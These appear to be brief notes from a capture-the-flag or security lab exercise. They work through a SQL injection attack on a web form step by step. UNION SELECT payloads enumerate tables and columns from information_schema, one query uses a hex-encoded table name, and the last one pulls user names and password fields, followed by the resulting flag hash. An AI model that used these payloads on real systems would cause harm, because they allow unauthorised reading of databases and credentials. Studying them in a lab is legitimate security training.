list members all: 
> 1 OR 1=1

list database tables :
> 1 UNION SELECT table_name,2 FROM information_schema.tables

list database columns :

> 1 UNION SELECT column_name,2 FROM information_schema.columns

You are listing tables from information_schema :

> 1 UNION SELECT table_name,2 
FROM information_schema.tables 
WHERE table_schema = database()

```
ID: 1 UNION SELECT table_name,2  FROM information_schema.tables  WHERE table_schema = database() 
First name: one
Surname : me
ID: 1 UNION SELECT table_name,2  FROM information_schema.tables  WHERE table_schema = database() 
First name: users
Surname : 2
```

list users :

> 1 UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'

> 1 UNION SELECT table_name,2 FROM information_schema.tables

> 1 UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name LIKE 0x7573657273 

0x7573657273  == "users" 

list users table columns :
> 1 UNION SELECT first_name,Commentaire FROM users 


> 1 UNION SELECT first_name,concat(last_name,Commentaire,countersign) FROM users WHERE first_name LIKE 0x466c6167 

First name: Flag
Surname : GetTheDecrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28


flag in sh256 without !:  
> 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
